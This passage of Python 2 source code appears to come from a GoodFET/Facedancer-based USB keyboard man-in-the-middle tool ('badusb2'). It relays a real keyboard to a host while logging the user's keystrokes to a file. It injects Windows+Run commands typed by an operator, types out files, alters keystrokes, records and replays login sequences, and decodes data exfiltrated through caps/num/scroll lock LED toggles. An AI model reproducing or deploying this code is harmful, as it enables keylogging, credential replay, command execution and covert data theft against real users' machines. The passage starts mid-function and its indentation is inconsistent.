		   wd.write(str(list(self.ep0_p2hdata))+'\n');             
               else:
                   wd.write(''); 
               wd.flush();
               wd.close();
            else: #For everything else
               self.ctl_read(self.ep0_h2pdata); # Get device descriptor into self.p2hdata
               #time.sleep(0.002);           # Device gets 2 msec recovery time
               # Send p2hdata to host
               print("P2H: %s" % self.ep0_p2hdata);
               wd = open(write_p2h_ep0, "w");
               if(len(self.ep0_p2hdata)>0):	   
		   wd.write(str(list(self.ep0_p2hdata))+'\n');             
               else:
                   wd.write('');
               wd.flush();
               wd.close();
         
            self.m2p_int();
        #return(p2h_resp_data)

    def m2p_int(self):
        ''' Fetches data from real peripheral interrupt '''
        self.ep3_p2hdata='';
	self.IN_Transfer_Int(1,8); # DK: HACK TODO set speed automatically or via argument.
        write_p2h_ep3 = "/tmp/write_p2h_ep3"
        wd = open(write_p2h_ep3, "w");
        if(len(self.ep3_p2hdata)>0):
	    print("Got some INT data sending %s" % self.ep3_p2hdata);
            wd.write(str(list(self.ep3_p2hdata))+'\n');
        else:
	    wd.write('');
        wd.flush();
        wd.close();
    

    def printstrings(self):
        print "Vendor  ID is %04x." % self.VID;
        print "Product ID is %04x." % self.PID;
        print "Manufacturer: %s" % self.manufacturer;
        print "Product:      %s" % self.product;
        print "Serial:       %s" % self.serial;
        
    def getDescriptorString(self, index):
        """Grabs a string from the descriptor string table."""
        # Get_Descriptor-String template. Code fills in idx at str[2].
        Get_Descriptor_String = [0x80,0x06,index,0x03,0x00,0x00,0x40,0x00];
        
        if index==0: return "MISSING STRING";
        
        status=self.ctl_read(Get_Descriptor_String);
        if status: return None;
        
        #Since we've got a string
        toret="";
        for c in self.ep0_p2hdata[2:len(self.ep0_p2hdata)]:
            if c>0: toret=toret+chr(c);
        return toret;
class GoodFETMAXUSBDevice(GoodFETMAXUSB):
    
    def hijack_ep(self, rcv):
        '''
        Take the descriptor, and modify the endpoints
        Taken from Von Tonder's TTWE code, however, it's hardcoded it doesn't work, TODO.
        '''
        self.verbose=True;
        rest = rcv[rcv[0]:] # start at interface     
        if len(rest) > 0: #there's more
            rest = rest[rest[0]:] # trim interface, start at endpoint a
            endpoint_a = rest[:rest[0]] # save endpoint a
            rest = rest[rest[0]:] # set start to endpoint b

            offset_a = 0x9 + 0x9 + 0x3 - 1
     
            endpoint_a_address = endpoint_a[2]
            desired_a = endpoint_a_address & 0x0f

            if self.verbose:
                print('---PERIPHERAL--||||---FACEDANCER---')

            if endpoint_a_address & 0x80: # IN
                if self.verbose:
                    print('MAP:   EP%dIN  <====>  EP%dIN' % (desired_a, 2))
                rcv[offset_a] = 0x80 | 0x02 
            else:
                if self.verbose:
                    print('MAP:   EP%dOUT <====>  EP%dOUT' % (desired_a, 1))
                rcv[offset_a] = 0x00 | 0x01 

      # 2ND ENDPOINT IF DETECTED:
            if len(rest) > 0:
                endpoint_b = rest[:rest[0]] # if there's still left, get it
                rest = rest[rest[0]:] # set start to endpoint index

                offset_b = 0x9 + 0x9 + 0x7 + 0x3 - 1

                endpoint_b_address = endpoint_b[2]
                desired_b = endpoint_b_address & 0x0f

                if endpoint_b_address & 0x80: # IN
                    if self.verbose:
                        print('MAP:   EP%dIN  <====>  EP%dIN' % (desired_b, 2))
                    rcv[offset_b] = 0x80 | 0x02 
                else:
                    if self.verbose:
                        print('MAP:   EP%dOUT <====>  EP%dOUT' % (desired_b, 1))
                    rcv[offset_b] = 0x00 | 0x01 


      # 3RD ENDPOINT, IF DETECTED:
            if len(rest) > 0:
                endpoint_c = rest
                offset_c = 0x9 + 0x9 + 0x7 + 0x7 + 0x3 - 1
                endpoint_c_address = endpoint_c[2]
                desired_c = endpoint_c_address & 0x0f

                rest = rest[rest[0]:]
                if len(rest) > 0:
                    print('THREE endpoints and theres STILL more: %s' % rest)

                if endpoint_c_address & 0x80: #IN, we can handle a third endpoint
                    if self.verbose:
                        print('MAP:   EP%dIN  <====>  EP%dIN' % (desired_c, 3))
                    rcv[offset_c] = 0x80 | 0x03
                else:
                    print('ERROR: 3RD ENDPOINT CANNOT BE HANDLED, NOT AN "IN" ENDPOINT')

            if self.verbose:
                print("MODIFIED endpoint descriptors: %s" % rcv)

        self.verbose=False;
        return rcv
    
    def send_descriptor(self,SUD):
        """Send the USB descriptors recieved from peripheral and send to the legitmate host."""
        
        desclen=0x08; # DK: TODO Set to low speed for keyboards, change for full speed to 0x64.
        reqlen=ord(SUD[wLengthL])+256*ord(SUD[wLengthH]); #16-bit length
        desctype=ord(SUD[wValueH]);
        # DK: We modify this function to pass data from real peripheral
        #print("static %s" % self.DD);
        # This is where we need to implement endpoint hijacking.
        if(len(self.ep0_p2hdata)==0):
	    print("Unhandled: Null Response data, returning...");
	    return

        ddata=eval(self.ep0_p2hdata);
        
        if desctype==GD_DEVICE:
            # desclen=ddata[0];
            # DK: This caused me hours of pain finding this! 
            # Peripheral must be set to 8, but 64 bytes (0x40) on the host side.
            # DK: No, its because the code only writes 8 bytes at a time being low speed, fixed.
            #ddata[7]=0x08;
            pass;
            #ddata=self.DD;
        elif desctype==GD_CONFIGURATION:
	    #ddata = self.hijack_ep(ddata);
            #desclen=ddata[2];
            # DK: Check to see if we have an endpoint descriptor that we need to hijack/remap.
            if(len(ddata)>29):
	        if(ddata[29]==0x81):
                    ddata[29]=0x83;
                    #ddata[54]=0x83; 
		    #print("Got endpoint 0x81.... hardcoded!! :(");
		    #print("Remapped to %d" % ddata[29]);
        elif desctype==GD_STRING:
	    pass;
            #desclen=ddata[0];
            #desclen=ord(self.strDesc[ord(SUD[wValueL])][0]);
            #ddata=self.strDesc[ord(SUD[wValueL])];
        elif desctype==GD_HID: # Set Report
            #Don't know how to do this yet.
             #desclen=ddata[0];
             pass;
        elif desctype==GD_REPORT: # RPIPE
	    #print("GD_REPORT LEN=%d" % ord(SUD[6]))
	    #if(self.rpipe_complete==0):
                 #desclen=0x3e; # HACK for testing
            #else:
	         #desclen=0x07; # HACK for testing
	    #desclen=SUD[6];
	    #desclen=ord(SUD[wLengthL])+256*ord(SUD[wLengthH]); #16-bit length
            #print("RPIPE LEN: %s" % SUD[6]);
            self.rpipe_complete=self.rpipe_complete+1;
        #TODO Configuration, String, Hid, and Report
        
        if desclen>0:
	    count=len(ddata);
            pos=0;
            while count>0:
            #Send desclen chunks or less if count the lessor of the two
                #while not(self.rreg(rEPIRQ)&bmIN0BAVIRQ): pass;
                c=min(count,desclen);
                print("Sending %s" % ddata[pos:pos+c]);
                self.writebytes(rEP0FIFO,ddata[pos:pos+c]);
                self.wregAS(rEP0BC,c);
                count=count-c;
                pos=pos+c;
                #Wait for the buffer to be free before continuing.
                #while not(self.rreg(rEPIRQ)&bmIN0BAVIRQ): pass;
            #Reduce desclen if asked for fewer bytes.
            #desclen=min(reqlen,desclen);
            #Send those bytes.
            #print("%s" % ddata[0:desclen]);
            #self.writebytes(rEP0FIFO,ddata[0:desclen]);
            #self.wregAS(rEP0BC,desclen);
        else:
            print "Stalling in send_descriptor() for lack of handler for %02x." % desctype;
            self.STALL_EP0(SUD);
    def set_configuration(self,SUD):
        """Set the configuration."""
        bmSUSPIE=0x10;
        configval=ord(SUD[wValueL]);
        if(configval>0):
            self.SETBIT(rUSBIEN,bmSUSPIE);
        self.rregAS(rFNADDR);
class GoodFETMAXUSBHID(GoodFETMAXUSBDevice):
    """This is an example HID keyboard driver, loosely based on the
    MAX3420 examples."""

    def hidinit(self):
        """Initialize a USB HID device."""
        self.usb_disconnect();
        self.usb_connect();
        
        self.hidrun();
            
    def hidrun(self):
        """Main loop of the USB HID MiTM."""
        while True:
            self.service_irqs();

    def m2h_report(self):
        #Grab setup packet from the buffer
        SUD=self.readbytes(rSUDFIFO,8);
        print("H2P: %s" % self.setup2str(self.ep0_h2pdata));
        
        if(len(SUD)==8):
            if(SUD[0]==0xa1 and SUD[1]==0x01):
	        print("Got a report!!!!!!");
    
        #Check if it is a set report packet
        
    
    def m2h(self):
        """Main peripheral emulation function"""
        
        self.ep0_h2pdata=""
        self.ep0_p2hdata=""
        
        write_h2p_ep0 = "/tmp/write_h2p_ep0"
        read_p2h_ep0 = "/tmp/write_p2h_ep0"
       
        #Grab the SETUP packet from the buffer.
        self.ep0_h2pdata=self.readbytes(rSUDFIFO,8);
        # Uncomment for debugging
        #print("H2P: %s" % self.setup2str(self.ep0_h2pdata));
        
        ### For Data Exfiltration via HID Output Reports on EP0-OUT
	 ## Ninja mode!! :)
        if(ord(self.ep0_h2pdata[0])==33):
	    #print("Got something here for reading!");

	    #f = open('workfile', 'w');
	    somedata=self.readbytes(rEP0FIFO,1); # HACK TODO: hardcoded endpoint
	    # Saving last report for state change detection, i.e. anyonehome hack etc.
	    # We only remove capslock lock file when state has changed.
	    cmdfile=os.path.isfile("/tmp/capslock");
            if(cmdfile):
		self.lastreport=ord(somedata[0])
                os.remove("/tmp/capslock")

	    #if(ord(somedata[0])!=self.lastreport):
		#print "State change, user is active!!!!"
		#self.lastreport=ord(somedata[0]);

	    ### Exfiltration using Morse Code technique (LED)
            if(ord(somedata[0]) != -1):
                print "Got " + str(ord(somedata[0]))
	 	#key=int(ord(somedata[0]))
                self.curled=int(ord(somedata[0]))
                self.lastreport=ord(somedata[0])
		key=abs((int(self.curled)-int(self.lastled)))
		#print "key -eq " + str(key) + " cur -eq " + str(self.curled) + " last -eq " + str(self.lastled)

            	if key==self.SCROLLLOCK:
                    #self.ledpress+=1
                    self.exfiltmp += 'S'
            	elif key==self.CAPSLOCK:
                    #self.ledpress+=1
                    self.exfiltmp += 'C'
            	elif key==self.NUMLOCK:
                    #self.ledpress+=1
                    self.exfiltmp += 'N'
            	if len(self.exfiltmp) == 3:
                    if self.exfiltmp.startswith('SSS'):
                        if self.ledstarted == 0:
                            print "Started exfiltration process..."
                            self.ledstarted=1
                        else:
                            self.ledstarted=0
                            print "LED Encoded Data Retrieved " + str(self.exfildata)
			    try:
                                h=self.exfilhid2hex(self.exfildata)
				print str(h.decode('hex'))
			    except:
				print "Error decoding exfildata..."
                            self.exfildata=''
			    self.exfiltmp=''
                            print "Exfiltration process ended."
                    else:
                        if self.ledstarted == 1:
                            self.exfildata += self.exfiltmp
                    self.exfiltmp=''
	        self.lastled=self.curled;

	    ### Exfiltration using hidlib and custom reports on
	     ## Ubuntu. Opted for something that works everywhere,
	     ## i.e. LED option.
	    #if(len(somedata)>0):
	       #i=len(somedata);
	       #odata=0;
	        #for i in somedata:
		    #if(ord(i)==10):
		        #print("");
		    #else:
		        #sys.stdout.write(i)
	                #print(i);
		#print(odata);
	    #print(ord(self.readbytes(rEP0FIFO,1)));
        
        #Send to pipe so peripheral can read it
        wd = open(write_h2p_ep0, "w");
        if(len(self.ep0_h2pdata)==8):
	    #print("writing %d" % len(self.ep0_h2pdata));
            wd.write(self.ep0_h2pdata);
        #else:
	    #no_h2pdatastr="00000000";
	    #print("writing %d" % len(no_h2pdatastr));
	    #wd.write(no_h2pdatastr); # prevent blocking
        wd.flush();
        wd.close();
        
        #Read data from peripheral via the pipe
        rd = open(read_p2h_ep0, "r");
        all_data="";
        if(ord(self.ep0_h2pdata[6])>0):
            while True:
                data=rd.read(ord(self.ep0_h2pdata[6]));
                if not data:
	            break;
	        all_data += data;
        else:
	    all_data=rd.read(0);
        self.ep0_p2hdata=all_data;
        #print("h2pdata[6] size: %d" % ord(self.h2pdata[6]));
        rd.close();
        # uncomment for debugging.
        # print("P2H: %s" % self.ep0_p2hdata);
        
        self.OsLastConfigType=ord(self.ep0_h2pdata[bmRequestType]);
	self.typepos=0;
        setuptype=(ord(self.ep0_h2pdata[bmRequestType])&0x60);
        if setuptype==0x00:
            self.std_request(self.ep0_h2pdata);
        elif setuptype==0x20:
            self.class_request(self.ep0_h2pdata);
        elif setuptype==0x40:
            self.vendor_request(self.ep0_h2pdata);
        else:
            print "Unknown request type 0x%02x." % ord(self.ep0_h2pdata[bmRequestType])
            self.STALL_EP0(self.ep0_h2pdata);
            print("Exiting Stall");
        
    def class_request(self,SUD):
        """Handle a class request."""
        if(len(self.ep0_p2hdata)>0):
            desclen=0x08; # DK: TODO Set to low speed for keyboards, change for full speed to 0x40 (64).
            reqlen=ord(SUD[wLengthL])+256*ord(SUD[wLengthH]); #16-bit length
            desctype=ord(SUD[bRequest]);
            if(len(self.ep0_p2hdata)==0):
	        print("Unhandled: Null Response data, returning...");
	        return

            ddata=eval(self.ep0_p2hdata);
       
            if desctype==HID_REPORT: # HID Get Report
	        print("GET REPORT FOUND, will move to IN3 primarily in service_irqs");
	    if desctype==0xff: # HID Set Report
	        print("Set Report found, work here..");
	        
            if desclen>0:
	        count=len(ddata);
                pos=0;
                while count>0:
                    c=min(count,desclen);
                    print("Sending %s" % ddata[pos:pos+c]);
                    self.writebytes(rEP0FIFO,ddata[pos:pos+c]);
                    self.wregAS(rEP0BC,c);
                    count=count-c;
                    pos=pos+c;
            
            # IN3 Ready for data, HACK TODO not a great way to do this.
            #self.intready=1;
            return; 
        
        # Disabled, until set report can work.
        #print "Stalling a class request.";
        #self.STALL_EP0(SUD);
        #pass
        return;
    def vendor_request(self,SUD):
        print "Stalling a vendor request.";
        self.STALL_EP0(SUD);
    def std_request(self,SUD):
        """Handles a standard setup request."""
        setuptype=ord(SUD[bRequest]);
        if setuptype==SR_GET_DESCRIPTOR: self.send_descriptor(SUD);
        #elif setuptype==SR_SET_FEATURE:
        #    self.rregAS(rFNADDR);
        #    # self.feature(1);
        elif setuptype==SR_SET_CONFIGURATION: self.set_configuration(SUD);
        elif setuptype==SR_GET_STATUS: self.get_status(SUD);
        elif setuptype==SR_SET_ADDRESS: self.rregAS(rFNADDR);
        elif setuptype==SR_GET_INTERFACE: self.get_interface(SUD);
        else:
            print "Stalling Unknown standard setup request type %02x" % setuptype;
            self.STALL_EP0(SUD);
            
    
    def get_interface(self,SUD):
        """Handles a setup request for SR_GET_INTERFACE."""
        if ord(SUD[wIndexL]==0):
            self.wreg(rEP0FIFO,0);
            self.wregAS(rEP0BC,1);
        else:
	    print("Get interface Stalling EP0");
            self.STALL_EP0(SUD);
    
    OsLastConfigType=-1;
#Device Descriptor
    DD=[0x12,	       		# bLength = 18d
        0x01,			# bDescriptorType = Device (1)
        0x00,0x01,		# bcdUSB(L/H) USB spec rev (BCD)
	0x00,0x00,0x00, 	# bDeviceClass, bDeviceSubClass, bDeviceProtocol
	0x40,			# bMaxPacketSize0 EP0 is 64 bytes
	0x6A,0x0B,		# idVendor(L/H)--Maxim is 0B6A
	0x46,0x53,		# idProduct(L/H)--5346
	0x34,0x12,		# bcdDevice--1234
	1,2,3,			# iManufacturer, iProduct, iSerialNumber
	1];
#Configuration Descriptor
    CD=[0x09,			# bLength
	0x02,			# bDescriptorType = Config
	0x22,0x00,		# wTotalLength(L/H) = 34 bytes
	0x01,			# bNumInterfaces
	0x01,			# bConfigValue
	0x00,			# iConfiguration
	0xE0,			# bmAttributes. b7=1 b6=self-powered b5=RWU supported
	0x01,			# MaxPower is 2 ma
# INTERFACE Descriptor
	0x09,			# length = 9
	0x04,			# type = IF
	0x00,			# IF #0
	0x00,			# bAlternate Setting
	0x01,			# bNum Endpoints
	0x03,			# bInterfaceClass = HID
	0x00,0x00,		# bInterfaceSubClass, bInterfaceProtocol
	0x00,			# iInterface
# HID Descriptor--It's at CD[18]
	0x09,			# bLength
	0x21,			# bDescriptorType = HID
	0x10,0x01,		# bcdHID(L/H) Rev 1.1
	0x00,			# bCountryCode (none)
	0x01,			# bNumDescriptors (one report descriptor)
	0x22,			# bDescriptorType	(report)
	43,0,                   # CD[25]: wDescriptorLength(L/H) (report descriptor size is 43 bytes)
# Endpoint Descriptor
	0x07,			# bLength
	0x05,			# bDescriptorType (Endpoint)
	0x83,			# bEndpointAddress (EP3-IN)		
	0x03,			# bmAttributes	(interrupt)
	64,0,                   # wMaxPacketSize (64)
	10];
    strDesc=[
# STRING descriptor 0--Language string
"\x04\x03\x09\x04",
# [
#         0x04,			# bLength
# 	0x03,			# bDescriptorType = string
# 	0x09,0x04		# wLANGID(L/H) = English-United Sates
# ],
# STRING descriptor 1--Manufacturer ID
"\x0c\x03M\x00a\x00x\x00i\x00m\x00",
# [
#         12,			# bLength
# 	0x03,			# bDescriptorType = string
# 	'M',0,'a',0,'x',0,'i',0,'m',0 # text in Unicode
# ], 
# STRING descriptor 2 - Product ID
"\x18\x03M\x00A\x00X\x003\x004\x002\x000\x00E\x00 \x00E\x00n\x00u\x00m\x00 \x00C\x00o\x00d\x00e\x00",
# [	24,			# bLength
# 	0x03,			# bDescriptorType = string
# 	'M',0,'A',0,'X',0,'3',0,'4',0,'2',0,'0',0,'E',0,' ',0,
#         'E',0,'n',0,'u',0,'m',0,' ',0,'C',0,'o',0,'d',0,'e',0
# ],


# STRING descriptor 3 - Serial Number ID
"\x14\x03S\x00/\x00N\x00 \x003\x004\x002\x000\x00E\x00"
# [       20,			# bLength
# 	0x03,			# bDescriptorType = string
# 	'S',0,				
# 	'/',0,
# 	'N',0,
# 	' ',0,
# 	'3',0,
# 	'4',0,
# 	'2',0,
# 	'0',0,
#         'E',0,
# ]
];
    RepD=[
        0x05,0x01,		# Usage Page (generic desktop)
	0x09,0x06,		# Usage (keyboard)
	0xA1,0x01,		# Collection
	0x05,0x07,		#   Usage Page 7 (keyboard/keypad)
	0x19,0xE0,		#   Usage Minimum = 224
	0x29,0xE7,		#   Usage Maximum = 231
	0x15,0x00,		#   Logical Minimum = 0
	0x25,0x01,		#   Logical Maximum = 1
	0x75,0x01,		#   Report Size = 1
	0x95,0x08,		#   Report Count = 8
	0x81,0x02,		#  Input(Data,Variable,Absolute)
	0x95,0x01,		#   Report Count = 1
	0x75,0x08,		#   Report Size = 8
	0x81,0x01,		#  Input(Constant)
	0x19,0x00,		#   Usage Minimum = 0
	0x29,0x65,		#   Usage Maximum = 101
	0x15,0x00,		#   Logical Minimum = 0,
	0x25,0x65,		#   Logical Maximum = 101
	0x75,0x08,		#   Report Size = 8
	0x95,0x01,		#   Report Count = 1
	0x81,0x00,		#  Input(Data,Variable,Array)
	0xC0]

    def get_status(self,SUD):
        """Get the USB Setup Status."""
        testbyte=ord(SUD[bmRequestType])
        
        #Toward Device
        if testbyte==0x80:
            self.wreg(rEP0FIFO,0x03); #Enable RWU and self-powered
            self.wreg(rEP0FIFO,0x00); #Second byte is always zero.
            self.wregAS(rEP0BC,2);    #Load byte count, arm transfer, and ack CTL.
        #Toward Interface
        elif testbyte==0x81:
            self.wreg(rEP0FIFO,0x00);
            self.wreg(rEP0FIFO,0x00); #Second byte is always zero.
            self.wregAS(rEP0BC,2);
        #Toward Endpoint
        elif testbyte==0x82:
            if(ord(SUD[wIndexL])==0x83):
                self.wreg(rEP0FIFO,0x01); #Stall EP3
                self.wreg(rEP0FIFO,0x00); #Second byte is always zero.
                self.wregAS(rEP0BC,2);
            else:
                self.STALL_EP0(SUD);
        else:
            self.STALL_EP0(SUD);

    typepos=0;
    typestrings={
	-1   : "Python does USB HID!\n",		# Unidentified OS.  This is the default typestring.
	0x00 : "OSX Hosts don't recognize Maxim keyboards.\n",	# We have to identify as an Apple keyboard to get arround the unknown keyboard error.
	0xA1 : "Python does USB HID on Linux!\n",
	0x81 : "                                                                                             Python does USB HID on Windows!\n",	# Windows requires a bit of a delay.  Maybe we can watch for a keyboard reset command?
    }
    def typestring(self):
	if self.typestrings.has_key(self.OsLastConfigType):
	    return self.typestrings[self.OsLastConfigType];
	else:
	    return self.typestrings[-1];
    # http://www.win.tue.nl/~aeb/linux/kbd/scancodes-14.html
    # Escape=0x29 Backsp=0x2A Space=0x2C CapsLock=0x39 Menu=0x65
    keymaps={
	'en_US'  :[ '    abcdefghijklmnopqrstuvwxyz1234567890\n\t -=[]\\\\;\'`,./',
		    '''      
  ''',	 # LeftCtrl
		    '    ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()     {}?+||:"~<>?', # LeftShift
		    '', # LeftCtrl & LeftShift
		    '    abc'], # LeftAlt
	'Dvorak' :[ '    axje.uidchtnmbrl\'poygk,qf;1234567890\n\t []/=\\\\s-`wvz',
		    '''       
                            ''',	 # LeftCtrl
		    '    AXJE UIDCHTNMBRL"POYGK<QF:!@#$%^&*()     {}?+||S_~WVZ', # LeftShift
		    '', # LeftCtrl & LeftShift
		    '    axj'], # LeftAlt
    }
    layout='en_US';
    def keymap(self):
	return self.keymaps[self.layout];
    modifiers={
	'None':		0b00000000,
	'LeftCtrl':	0b00000001,
	'LeftShift':	0b00000010,
	'LeftAlt':	0b00000100,
	'LeftGUI':	0b00001000,
	'RightCtrl':	0b00010000,
	'RightShift':	0b00100000,
	'RightAlt':	0b01000000,
	'RightGUI':	0b10000000
    }

    def asc2hid(self,ascii):
        """Translate ASCII to an USB keycode."""
	if type(ascii)!=str:
	    return (0,0);		# Send NoEvent if not passed a character
        if ascii==' ':
            return (0,0x2C);		# space
	for modset in self.keymap():
	    keycode=modset.find(ascii);
	    if keycode != -1:
		modifier = self.keymap().index(modset)
		return (modifier, keycode);
	return (0,0);
      
    # DK: Function that converts LEDs to readable data for exfiltration
    def exfilhid2hex(self, str):
	''' Translate LED combinations to hex'''
        r=''
        dict={  'CCN':'A','CCS':'B','CNC':'C','CNN':'D','CNS':'E','CSC':'F',
                'CSN':'0','CSS':'1','NCC':'2','NCN':'3','NCS':'4','NNC':'5',
                'NNS':'6','NSC':'7','NSN':'8','NSS':'9'}

        while str:
		if str[:3] in dict.keys():
                	r+=dict[str[:3]]
                str = str[3:]
        return r

    # DK: Function converts keycodes back to ASCII
    def hid2asc(self,modset,keycode):
        '''Translate keycodes to ASCII'''
        if type(keycode)!=int:
	    return(0);
	print 'modset is ' + str(modset);
	print 'keycode is ' + str(keycode);
	if (modset < len(self.keymap())):
	    if (keycode < len(self.keymap()[modset])):
            	return(self.keymap()[modset][keycode]);
	else:
	    return 0;
 
    def asc2hidMod(self,ascii):
        """Translate ASCII to an USB keycode."""
	if type(ascii)!=str:
	    return [0,0,0,0,0,0,0,0];		# Send NoEvent if not passed a character
        if ascii==' ':
            return [0,0,0x2C,0,0,0,0,0];		# space
	for modset in self.keymap():
	    keycode=modset.find(ascii);
	    if keycode != -1:
		modifier = self.keymap().index(modset)
		return ([modifier,0,keycode,0, 0,0,0,0, 0,0,0,0, 0,0,0,0]);
	return [0,0,0,0,0,0,0,0];
      
    def type_IN3(self):
	"""Type next letter in buffer."""
	string=self.typestring();
	if self.typepos>=len(string):
	    self.typeletter(0);		# Send NoEvent to indicate key-up
	    exit(0);
	    self.typepos=0;		# Repeat typestring forever!
	    # This would be a great place to enable a typethrough mode so the host operator can control the target
	else:
	    if self.usbverbose:
		sys.stdout.write(string[self.typepos]);
		sys.stdout.flush();
	    self.typeletter(string[self.typepos]);
	    self.typepos+=1;
	return;
    def typeletter(self,key):
        """Type a letter on IN3.  Zero for keyup."""
	mod=0;
	if type(key)==str:
	    (mod, key) = self.asc2hid(key);
	self.wreg(rEP3INFIFO,mod);
        self.wreg(rEP3INFIFO,0);
        self.wreg(rEP3INFIFO,key);
        self.wreg(rEP3INBC,3);
    def do_IN3(self):
        """Handle IN3 event."""
        #Don't bother clearing interrupt flag, that's done by sending the reply.
        
        #DK: I'm sure there is a better way to do this
        #Send NULLS to EP0 so peripheral read pipe doesn't bloc
        #write_h2p_ep0 = "/tmp/write_h2p_ep0"
        read_p2h_ep3 = "/tmp/write_p2h_ep3";
        
        #print("Before H2P Write");
        #wd = open(write_h2p_ep0, "w");
        #no_h2pdatastr="00000000";
	#print("writing %d" % len(no_h2pdatastr));
	#wd.write(no_h2pdatastr); # prevent blocking
        #wd.flush();
        #wd.close();
        #print("After H2P Write");

        #DK: Read IN3    
        rd = open(read_p2h_ep3, "r");
        all_data=rd.readline();
        #all_data="";
        #while True:
                #data=rd.read(1);
                #if not data:
	            #break;
	        #all_data += data;
        #else:
	    #all_data=rd.read(0);
        rd.flush();
        rd.close();
        #print("EP3 Read %d" % len(all_data));
        intdata=all_data;
        #keyup=[0x00,0x00,0x00,0x00]
        if(len(intdata)>0):
            intdata=eval(intdata);

	    ### Eavesdropping. Try Record the whole session in ASCII
	    try:
	    	f=open('/tmp/badusb2-recorded','a');
		if(intdata[2]>0):
		    f.write(str(self.hid2asc(intdata[0], intdata[2])));
	    except IOError:
		print "Can't record session passing..."
	 	pass
	    else:
		f.close();

	    ### Fabricate. CapsLock Anyone Home Trick.
	    cmdfile=os.path.isfile("/tmp/capslock");
            if(cmdfile):
                # Capslock 
                intdata+=[0,0,57,0,0,0,0,0]; # Caps Key
                intdata+=[0,0,0,0,0,0,0,0]; # key up

	    ### Fabricate. Start + Run Command Execution
	    cmdfile=os.path.isfile("/tmp/startrun");
            if(cmdfile):
                # Start + Run
                intdata+=[8,0,21,0,0,0,0,0]; # Windows + Run
		# Enter a command to send to the host.
                data=raw_input("Type a command: ");
                for i in range(len(data)):
                    intdata+=self.asc2hidMod(data[i]);
                intdata+=[0,0,40,0,0,0,0]; # Enter key
                intdata+=[0,0,0,0,0,0,0,0]; # key up
                os.remove("/tmp/startrun")

	    ### Fabricate. a message when we create a file "/tmp/cmd"
            cmdfile=os.path.isfile("/tmp/cmd");
            if(cmdfile):
                # Enter a command to send to the host.
                data=raw_input("Type a message: ");
                for i in range(len(data)):
                    intdata+=self.asc2hidMod(data[i]);
                intdata+=[0,0,40,0,0,0,0]; # Enter key
                intdata+=[0,0,0,0,0,0,0,0]; # key up
                os.remove("/tmp/cmd");
           
	    ### send a file by "typing" it out.
	    cmdfile="/tmp/badusb2-copyme"
	    cmdbool=os.path.isfile(cmdfile);
	    if(cmdbool):
		print "Found copyme file";
	        try:
                    f=open(cmdfile,'r');
		    for line in f:
		        for i in range(len(line)):
		    	    intdata+=self.asc2hidMod(line[i]);
           	except IOError:
                    print "Error accessing file.";
                    pass;
            	else:
		    f.close();
                intdata+=[0,0,40,0,0,0,0]; # Enter key
                intdata+=[0,0,0,0,0,0,0,0]; # key up
                os.remove(cmdfile);

            ### Fabricate a message when we create a file on the MC "/tmp/cmd2"
            # Sample POC, needs a shell open and the HID binary in the current directory.
            cmdfile=os.path.isfile("/tmp/cmd2");
            if(cmdfile):
	        # Enter a command to send to the host.
		print "Example: g('o') # where g() is the function & o is the filename."
                data=raw_input("Exfil command & filename: ")
                for i in range(len(data)):
		    intdata+=self.asc2hidMod(data[i]);
		# redirect std output to file "o" and send output through HID
		# A bit messy, but works as POC
		intdata+=[0,0,40,0,0,0,0]; # Enter key
		intdata+=[0,0,0,0,0,0,0,0]; # key up
                os.remove("/tmp/cmd2");           
   
            ### Intercept and modify user keystrokes in realtime
	    if(intdata[2] > 0):
	    	cmdfile=os.path.isfile("/tmp/modify");
            	if(cmdfile):
			intdata[2]=int(intdata[2]-1)

	    ### Capture login session for replay.
	    if(intdata[0]==5 and intdata[2]==99):
	        print("Ctrl-Alt-Delete Entered, recording...");
	        self.recdata=[];
	        self.recstatus=True;
	    if(intdata[2]==40):
	        if(self.recstatus):
		    print("Return key pressed, disabling record");
		    self.recdata+=intdata; # Add enter key.
		    self.recdata+=[0,0,0,0,0,0,0,0] # key-up
		    print("Keys recorded: %s" % self.recdata);
	            self.recstatus=False;
	    if(self.recstatus):
	        print("Recording key press %s" % intdata);
	        self.recdata+=intdata;
	    #if(intdata[0]==2 and intdata[2]==30): # Exclamation markers
	        #print("Replaying login data");
	        #intdata=self.recdata;
	    repfile=os.path.isfile("/tmp/replay");
            if(repfile):
		if(self.recdata):
	    	    print("Replaying login data");
 	            intdata=self.recdata;
	   	    os.remove("/tmp/replay");
		else:
		    print "No recorded data to replay";
		    os.remove("/tmp/replay");

	    # Final bits
            pos=0;
            desclen=8; # HACK TODO DK: hardcoded for low speed.
            count=len(intdata);
            if(count>8):
                while count>0:
                    c=min(count,desclen);
                    print("Sending %s" % intdata[pos:pos+c]);
                    self.writebytes(rEP3INFIFO,intdata[pos:pos+c]);
                    self.wregAS(rEP3INBC,c);
                    time.sleep(0.3);
                    count=count-c;
                    pos=pos+c;
            else:
                self.writebytes(rEP3INFIFO,intdata);
                self.wregAS(rEP3INBC,8);
            # Write key up cos of delay
            #self.writebytes(rEP3INFIFO,keyup);
            #self.wregAS(rEP3INBC,3);
            #self.m2h_report(); 
        
